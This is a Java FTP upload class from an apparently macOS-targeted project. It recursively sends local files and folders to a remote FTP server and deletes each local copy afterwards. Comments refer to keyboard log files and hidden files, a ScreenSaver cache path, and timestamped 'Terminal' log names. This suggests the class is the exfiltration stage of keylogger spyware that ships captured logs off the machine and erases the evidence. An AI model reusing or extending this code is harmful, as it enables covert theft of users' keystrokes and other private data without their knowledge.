package mac.project.ftp;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.nio.charset.Charset;

import sun.net.TelnetInputStream;
import sun.net.TelnetOutputStream;
import sun.net.ftp.FtpClient;
import java.util.StringTokenizer;
import org.omg.CORBA.portable.OutputStream;

public class FileUpload implements Runnable {
	
	FtpPanel fp;
	FtpClient ftpCli;
	private String srcFile;
	TelnetInputStream inStream = null;
	
	public FileUpload(String src, FtpPanel fp, FtpClient fc){
		this.srcFile = src;
		this.fp = fp;
		this.ftpCli = fc;
	}
	
	public void run() {
		try{
			upload(srcFile);
			//上传成功的提示信息，非调试时请闭掉
			System.out.println("上传完毕");
		}
		catch(Exception e) {
			System.err.println("Error in FileUpload.run: " + e.getMessage());
		}
	}
	
	/**
	 * ftp上传 如果服务器段已存在名为filename的文件夹，该文件夹中与要上传的文件夹中同名的文件将被替换
	 * 
	 * @param filename  要上传的文件（或文件夹）名
	 * @return boolean
	 *
	 */
	public boolean upload(String upfilename) {

		String newname = "";	//newname为文件路径的最后一段/Library/Caches/com.apple.ScreenSaver中的com.apple.ScreenSaver
		String filename = "";
		filename = new String(upfilename);
		System.out.println("系统默认的字符集："+System.getProperty("file.encoding"));
		try {
			filename = new String(upfilename.getBytes("UTF-8"),"UTF-8");//用UTF-8处理字符串
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}
		if (filename.indexOf("/") > -1) {
			newname = filename.substring(filename.lastIndexOf("/") + 1);
		} else if(filename.indexOf("\\") > -1) {
			newname = filename.substring(filename.lastIndexOf("\\") + 1);
		}else {
			newname = filename;
		}
		OutputStream os = null;
		FileInputStream is = null;
		try {
			File file_in = new File(filename);// 打开本地待上传的文件或文件夹
			if (!file_in.exists()) {
				throw new Exception("此文件或文件夹[" + file_in.getName() + "]有误或不存在!");
			}
			if (file_in.isDirectory()) {	//文件夹上传
				String ftppwd = ftpCli.pwd();
				upload(file_in.getPath(), newname, ftppwd);
			} else {						//文件上传
				String name = newname;
//				if (newname.startsWith(".")) {	//处理键盘日志文件和隐藏文件
//					name = newname.substring(1);
//				} else
					if(newname.endsWith("EN")){
					name = covertName(newname);
				}
				uploadFile(file_in.getPath(), name);
			}
			return true;
		} catch (Exception e) {
			//			e.printStackTrace();
			System.err.println("Exception e in FileUpload()87: " + e.toString());
			return false;
		} finally {
			try {
				if (is != null) {
					is.close();
				}
				if (os != null) {
					os.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
	/**
	 * 上传文件或者文件夹
	 * 
	 * @param fileName
	 * @param newName
	 * @param path
	 * @throws Exception
	 */
	private void upload(String fileName, String newName, String path) throws Exception {//path对应ftp服务器上的文件夹路径
		ftpCli.cd(path);
//		ftpCli.sendServer("cd " +"No1"+ "\r\n");
		File file_in = new File(fileName);// 打开本地待上传的文件
		if (!file_in.exists()) {
			throw new Exception("此文件或文件夹[" + file_in.getName() + "]有误或不存在!");
		}
		if (file_in.isDirectory()) {
			if (!isDirExist(newName)) {
				createDir(newName);
			}
			ftpCli.cd(newName);
			File sourceFile[] = file_in.listFiles();
			for (int i = 0; i < sourceFile.length; i++) {
				if (!sourceFile[i].exists()) {
					continue;
				}
				if (sourceFile[i].isDirectory()) {
					this.upload(sourceFile[i].getPath(), sourceFile[i].getName(), path + File.separator + newName);
				} else {
					String name = sourceFile[i].getName();
//					if (sourceFile[i].getName().startsWith(".")) {
//						name = sourceFile[i].getName().substring(1);
//					} else 
						if(sourceFile[i].getName().endsWith("EN")){
						name = covertName(sourceFile[i].getName());
					}
					this.uploadFile(sourceFile[i].getPath(), name);
				}
			}
		} else {
			String name = newName;
//			if (newName.startsWith(".")) {
//				name = newName.substring(1);
//			} else 
				if(newName.endsWith("EN")){
				name = covertName(newName);
			}
			uploadFile(file_in.getPath(), name);
		}
		ftpCli.cd(path);
		System.out.println("ftppwd == " + ftpCli.pwd());
	}

	/**
	 * upload 上传文件
	 * @param filename 要上传的文件名
	 * @param newname 上传后的新文件名
	 * @return
	 * @throws Exception
	 * long   已经上传文件的大小,异常返回-1
	 *
	 */
	public long uploadFile(String filename, String newname) throws Exception {
		TelnetOutputStream os = null;
		FileInputStream is = null;
		long result =0;
		System.out.println("newname=="+newname);
		try {
			java.io.File file_in = new java.io.File(filename);
			if (!file_in.exists()) {
				return -1;
			}
			os = ftpCli.put(newname);
			is = new FileInputStream(file_in);
			byte[] bytes = new byte[1024];
			int c;
			while ((c = is.read(bytes)) != -1) {
				os.write(bytes, 0, c);
				result += c;
			}
			file_in.delete();
			return result;
		} finally {
			if (is != null) {
				is.close();
			}
			if (os != null) {
				os.close();
			}
			java.io.File file_in = new java.io.File(filename);
			if (file_in.exists()) {
				file_in.delete();
			} else return -1;
		}
	}

	/**
	 * 检查文件夹在当前目录下是否存在 
	 * @param dir
	 * @return boolean
	 */
	public boolean isDirExist(String dir) {
		String pwd = "";
		try {
			pwd = ftpCli.pwd();
			ftpCli.cd(dir);
			ftpCli.cd(pwd);
		} catch (Exception e) {
			return false;
		}
		return true;
	}
	
	public String covertName(String covetname){
		String name = "";
		name = new String(covetname);
		try {
			name = new String(covetname.getBytes("UTF-8"),"UTF-8");//用UTF-8处理字符串
			System.out.println(name.getBytes(Charset.forName("UTF-8")).length);
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();										//终端_Sun_Jun_10_20_31_22_2012EN
		}
		String srcName = name.substring(0, name.length()-2);	//name=终端_Tue_Jun__5_19_03_35_2012EN
		String tmpName[] = srcName.split("_");
		int nameLength = tmpName.length;
		String desName = tmpName[0]+"_"+tmpName[nameLength-1]+"_"+tmpName[2]+"_"+tmpName[nameLength-5]+"_"+tmpName[1]
		                            +"_"+tmpName[nameLength-4]+"_"+tmpName[nameLength-3]+"_"+tmpName[nameLength-2]+"EN";
		return desName;			//name=终端_2012_Jun_5_Tue_19_03_35EN
	}

	/**
	 * 在当前目录下创建文件夹 
	 * @param dir
	 * @return boolean
	 * @throws Exception
	 */
	public boolean createDir(String dir) {
		try {
			ftpCli.ascii();
			StringTokenizer s = new StringTokenizer(dir, File.separator); // sign
			s.countTokens();
			String pathName = ftpCli.pwd();
			while (s.hasMoreElements()) {
				pathName = pathName + File.separator + (String) s.nextElement();
				System.out.println("pathName=="+pathName);
				try {
					ftpCli.sendServer("MKD " + pathName + "\r\n");
				} catch (Exception e) {
					e.printStackTrace();
					return false;
				}
				ftpCli.readServerResponse();
			}
			ftpCli.binary();
			return true;
		} catch (IOException e1) {
			e1.printStackTrace();
			return false;
		}
	}
}

